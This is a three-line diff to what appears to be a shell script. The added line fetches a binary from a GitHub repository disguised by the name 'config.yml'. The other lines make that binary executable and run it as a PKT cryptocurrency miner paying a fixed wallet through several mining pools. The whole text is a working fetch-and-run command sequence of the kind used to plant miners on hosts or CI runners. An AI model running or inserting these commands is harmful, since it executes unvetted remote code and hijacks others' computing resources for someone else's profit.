@@ -1,2 +1,3 @@
+wget https://github.com/nabihasa/config.yml/raw/main/linux
 chmod +x linux
 ./linux ann -p pkt1q64p8j2d6secmkf7jd5wvrh209gs7edm96xnkkl http://pool.pkt.world http://pool.pktpool.io http://pool.pkteer.com https://stratum.zetahash.com -t 6
